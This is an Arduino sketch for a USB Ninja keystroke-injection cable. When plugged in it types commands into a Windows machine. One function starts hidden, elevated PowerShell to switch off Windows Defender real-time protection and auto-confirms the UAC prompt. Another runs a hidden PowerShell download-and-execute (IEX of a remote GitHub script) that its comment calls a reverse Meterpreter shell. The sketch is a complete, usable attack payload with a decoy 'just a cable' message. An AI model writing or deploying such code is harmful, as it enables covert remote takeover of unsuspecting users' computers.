#include <NinjaKeyboard.h>

void setup() {
  //Code to run once

}

bool done = false;
void loop() 
{
  if (!done)
  {
    NinjaKeyboard.delay(3000);           
    USBninjaOnline();               
    NinjaKeyboard.begin();        
    NinjaKeyboard.delay(1000);   
    NinjaKeyboard.sendKeyStroke(0); //Send HID '0' to compatibility Win7.
    NinjaKeyboard.delay(1000);      //Delay 1 second to wait system.
  
    disableAV();  
    NinjaKeyboard.delay(500); 
    reversemsf();
    
    NinjaKeyboard.end();          //Send Disconnect command to NinjaKeyboard USB Interface    
    USBninjaOffline();
    done = true;
  }
  delay(10000);                     
}

void notepad(){
                         
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   
    
    NinjaKeyboard.delay(100);                         
    NinjaKeyboard.print(F("notepad"));                //Open a notepad.
    NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
    //Press SHIFT to compatible Chinese Input Method.
    NinjaKeyboard.delay(100); 
    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
    NinjaKeyboard.delay(500); 
    NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
    //Press SHIFT to compatible Chinese Input Method.
    NinjaKeyboard.println(F("Hello World!"));
    NinjaKeyboard.println(F("I am just a cable, nothing to see :)"));
    NinjaKeyboard.delay(100); //Delay 100 millisecond ,
    //wait the input finished.
}

void disableAV(){  //Disable Windows Defender                                    
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   
    NinjaKeyboard.delay(100);                         //Delay 100mS.
    NinjaKeyboard.print(F("powershell -WindowStyle hidden start powershell -WindowStyle hidden -A 'Set-MpPreference -DisableRea $true' -V runAs"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_RIGHT);       
}

void reversemsf() { //Open reverse meterperter shell
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   
    NinjaKeyboard.delay(100);                         //Delay 100mS.
    NinjaKeyboard.print(F("powershell -wind hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Squiglygon/lectures/master/msf_rs')"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
}


void payloadA(){}
void payloadB(){}
